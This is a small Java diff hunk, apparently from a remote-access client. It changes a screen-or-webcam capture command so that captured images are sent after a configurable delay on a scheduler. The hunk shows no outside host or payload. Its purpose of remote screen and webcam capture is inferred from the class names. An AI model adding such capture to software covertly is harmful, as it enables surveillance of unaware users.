@@ -153,7 +153,7 @@ public class ClientCommandScreenWebcam extends ClientCommand {
                         ImageComponents.SCREEN = TASK;
                     }
                 } else {
-                    ImageComponents.sendImage(webcam ? 2 : 1, image);
+                    ConnectClient.EXECUTOR.schedule(() -> ImageComponents.sendImage(webcam ? 2 : 1, image), Connect.DELAY, Connect.DELAY_TYPE);
                 }
             }).start();
         } catch (Exception ignored) {
